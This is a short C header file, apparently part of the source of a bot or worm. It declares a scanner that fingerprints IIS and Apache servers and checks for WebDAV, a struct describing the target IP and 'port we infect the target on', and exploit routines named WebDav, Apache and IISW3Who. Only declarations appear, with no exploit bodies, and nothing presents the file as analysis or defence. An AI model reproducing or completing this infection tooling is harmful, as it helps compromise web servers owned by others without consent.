


#ifndef __HTTPSCANNER_H__
#define __HTTPSCANNER_H__

enum 
{
	// Just low-detail return
	HTTP_TYPE_UNKNOWN,				// Unknown httpd respond... 
	HTTP_TYPE_IIS_60,				// IIS 6.0 httpd running...
	HTTP_TYPE_IIS_55,				// IIS 5.5 httpd running...
	HTTP_TYPE_IIS_50,				// IIS 5.0 httpd running...
	HTTP_TYPE_IIS_40,				// IIS 4.0 httpd running...
	HTTP_TYPE_APACHE_1X_UNIX,		// Apache 1.x on (Unix) ...
	HTTP_TYPE_APACHE_1X_WIN32,		// Apache 1.x on (Win32)...
	HTTP_TYPE_APACHE_2X_UNIX,		// Apache 2.x on (Unix) ...
	HTTP_TYPE_APACHE_2X_WIN32,		// Apache 2.x on (Win32)...
	HTTP_OPTION_UNKNOWN,			// Unknown option responded...
	HTTP_OPTION_WEBDAV				// Webdav option responded ...
};

struct HttpExploitInfo_s 
{
	unsigned short	usRemotePort;			// Port we infect the target on
	DWORD			dwRemoteIp;				// Target IP in network format
	DWORD			dwExploitId;			// Pointer to the exploit id
	int				iServerType;			// Remote server version
	int				iRemoteHttpOption;		// Any option on remote server
};

//| Connect to the assigned page, and check the header from the
//| web-browser. The output will contain a pointer to a server
//| type in the enum. We can use this function to validate if the
//| server we're requesting really is a server of the type we're
//| in need for
int		HTTPServerVersion(SOCKET sSocket);

//| This function will determine the availeble options on the
//| remote server. --TODO: add SSL check
int		CheckOptions(ExploitInfo_s* pExploitInfo);

//! Http related exploits
void	WebDav(ExploitInfo_s* pExploitInfo);
void	Apache(ExploitInfo_s* pExploitInfo);
void	IISW3Who(ExploitInfo_s* pExploitInfo);

#endif // __HTTPSCANNER_H__

